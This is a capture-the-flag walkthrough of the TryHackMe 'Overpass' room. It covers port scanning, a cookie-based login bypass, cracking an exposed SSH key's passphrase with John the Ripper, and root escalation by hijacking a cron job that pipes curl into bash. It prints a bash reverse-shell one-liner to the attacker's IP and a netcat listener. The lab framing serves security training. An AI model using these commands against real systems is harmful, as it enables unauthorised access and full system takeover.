# Overpass

### Overpass

Room link: https://tryhackme.com/room/overpass

### Scanning

I ran an nmap aggressive scan on the box using `nmap -A [Remote IP]`.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.61 seconds
```

Just to cover all my bases, I also ran a full port scan on the box to see if there were any random open ports using `nmap -p- [Remote IP]`.

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 47.09 seconds
```

So, it appears that we are only working with ssh and http for services.

### Enumeration

Let's use Nikto and gobuster to enumerate the website. I like using Nikto with the `-h` option and gobuster with the `directory-list-1.0.txt` file produced by SecLists (https://github.com/danielmiessler/SecLists). Depending on your computing capability, it may take a while to complete directory enumeration

The output of Nikto shows interesting locations like /admin, /downloads, and /img.

```
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ Uncommon header 'x-content-type-options' found, with contents: nosniff
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-3092: /admin.html: This might be interesting...
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /downloads/: This might be interesting...
+ OSVDB-3092: /img/: This might be interesting...
+ 6544 items checked: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2022-02-17 18:52:51 (GMT-5) (596 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Gobuster produced some of the same information.

```
=====================================================
/downloads (Status: 301)
/img (Status: 301)
/admin (Status: 301)
/aboutus (Status: 301)
/css (Status: 301)
/**http%!A(MISSING)%!F(MISSING)%!F(MISSING)www (Status: 301)
/**http%!A(MISSING)%!F(MISSING)%!F(MISSING)ad (Status: 301)
=====================================================
2022/02/17 19:09:32 Finished
=====================================================
```

### Initial Access

The /admin page asks for a username and password. Using the Network section in Developer Tools on the browser, I can see that when the login button is pressed a login.js script runs. I took a look at the login.js file.

```
async function postData(url = '', data = {}) {
    // Default options are marked with *
    const response = await fetch(url, {
        method: 'POST', // *GET, POST, PUT, DELETE, etc.
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *client
        body: encodeFormData(data) // body data type must match "Content-Type" header
    });
    return response; // We don't always want JSON back
}
const encodeFormData = (data) => {
    return Object.keys(data)
        .map(key => encodeURIComponent(key) + '=' + encodeURIComponent(data[key]))
        .join('&');
}
function onLoad() {
    document.querySelector("#loginForm").addEventListener("submit", function (event) {
        //on pressing enter
        event.preventDefault()
        login()
    });
}
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

The most important section is the `login()` function, specifically the `Cookies.set("SessionToken",statusOrCookie)`. With this information, I can set the Cookie to be blank, which bypasses the if statement (`if (statusOrCookie === "Incorrect credentials")`) and authenticates. I will set the Cookie in the Developer Tools console with:

```
Cookies.set("SessionToken","")
```

After setting the Cookie, I simply reload the /admin page and I will authenticate and login.

### Exploitation

After authenticating, I am presented with an RSA private key on the /admin page:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----
```

I attempted to authenticate with the rsa private key (make sure to set the correct permissions with `chmod 400 ssh_james`) as `ssh -i ssh_james james@[THM IP]`. However, it requested a passphrase:

```
Enter passphrase for key 'ssh_james': 
```

Therefore, I needed to use John the Ripper to crack the passphrase for me. ssh2john is a great python script within john that helps me to format the private key for use with john.

```
./ssh2john.py ~/TryHackMe/practice/ssh_james > /home/ajread/TryHackMe/practice/ssh_james_hash.txt
```

Now that it is properly formatted, I can attempt to crack the passphrase with John the Ripper. I used rockyou as the wordlist.

```
./john --wordlist=/home/ajread/resources/wordlists/rockyou.txt /home/ajread/TryHackMe/practice/ssh_james_hash.txt
```

The passphrase returned:

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
[REDACTED]          (/home/ajread/TryHackMe/practice/ssh_james)     
1g 0:00:00:00 DONE (2022-02-17 20:32) 25.00g/s 334400p/s 334400c/s 334400C/s 100588..handball
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

With the passphrase, I am able to login as user james and find flag at user.txt.

```
james@overpass-prod:~$ id
uid=1001(james) gid=1001(james) groups=1001(james)
```

### Privilege Escalation

After logging in as james, there is a txt file with a possible hint for privilege escalation:

```
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

The note gave hints to a possible "automated build script" which makes me think about crontab. Looking at /etc/crontab:

```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

The last line (`* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash`) looks interesting and should be investigated since it is run by root. To check out the build script, I used curl to grab it from http://\[RemoteIP]/downloads/src/buildscript.sh.

```
GOOS=linux /usr/local/go/bin/go build -o ~/builds/overpassLinux ~/src/overpass.go
## GOOS=windows /usr/local/go/bin/go build -o ~/builds/overpassWindows.exe ~/src/overpass.go
## GOOS=darwin /usr/local/go/bin/go build -o ~/builds/overpassMacOS ~/src/overpass.go
## GOOS=freebsd /usr/local/go/bin/go build -o ~/builds/overpassFreeBSD ~/src/overpass.go
## GOOS=openbsd /usr/local/go/bin/go build -o ~/builds/overpassOpenBSD ~/src/overpass.go
echo "$(date -R) Builds completed" >> /root/buildStatus
```

Basically, the job runs and updates builds from latest code using go. If I can change the buildscript to execute a reverse shell, it will be executed by root and I will have escalated privileges. In order to do so, I noticed the `overpass.thm` in crontab, meaning it references the `/etc/hosts` file to obtain the correct IP address. Therefore, if I can change the `/etc/hosts` file to point at my remote machine when it calls the buildscript, the job will call my attack box IP address and run the buildscript on my machine. To ensure I can update `/etc/hosts` file I checked the permissions.

```
-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
```

Right now, the `/etc/hosts` file looks like the below.

```
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

It needs to be changed to reflect my local/attack box IP.

```
127.0.0.1 localhost
127.0.1.1 overpass-prod
[Local IP] overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Let me create a reverse shell in bash and place it within my local machine at `/downloads/src/buildscript.sh`.

```
echo "bash -i >& /dev/tcp/[Local IP]/5555 0>&1" > buildscript.sh
```

After creating the buildscript, I need to start up a python3 http server on port 80 in the parent directory of `/downloads/src/buildscript.sh`for the remote machine to call with the crontab.

```
sudo python3 -m http.server 80
```

Now, in a different terminal, I start a netcat listener on port 5555 to receive the reverse shell.

```
nc -lnvp 5555
```

After a certain period of time, the job calls the build script, creates a reverse shell and escalates privilege!

I can see the HTTP GET request by the Overpass machine to my local machine.

```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.118.191 - - [18/Feb/2022 08:00:01] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
```

In the terminal where my netcat listener is set up, I am dropped into a root shell.

```
root@overpass-prod:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```
